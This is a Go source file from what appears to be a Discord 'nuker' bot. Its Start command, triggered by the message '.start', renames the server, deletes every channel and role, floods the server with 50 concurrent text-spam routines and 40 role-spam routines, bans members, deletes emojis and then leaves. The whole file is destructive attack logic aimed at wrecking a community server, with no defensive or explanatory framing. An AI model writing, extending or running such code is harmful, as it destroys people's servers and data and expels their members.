package commands

import (
	"Dynamic/core/creating"
	"Dynamic/core/removing"
	"Dynamic/core/start_end"
	"sync"

	"github.com/bwmarrin/discordgo"
)

func Start(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == ".start" {
		s.ChannelMessageDelete(m.ChannelID, m.ID)
		start_end.Logs(s, m)
		creating.GuildRename(s, m)

		wg.Add(1)
		go func() {
			defer wg.Done()
			creating.DeleteChannels(s, m)
		}()
		wg.Wait()

		for i := 0; i < 50; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				creating.TextSpam(s, m, wg)
			}()
		}
		wg.Wait()

		wg.Add(1)
		go func() {
			defer wg.Done()
			creating.DeleteRoles(s, m)
		}()
		wg.Wait()

		for i := 0; i < 40; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				creating.RolesSpam(s, m)
			}()
		}
		wg.Wait()

		removing.MemberBan(s, m)
		removing.EmojiDelete(s, m)

		start_end.Leave(s, m)
	}
}
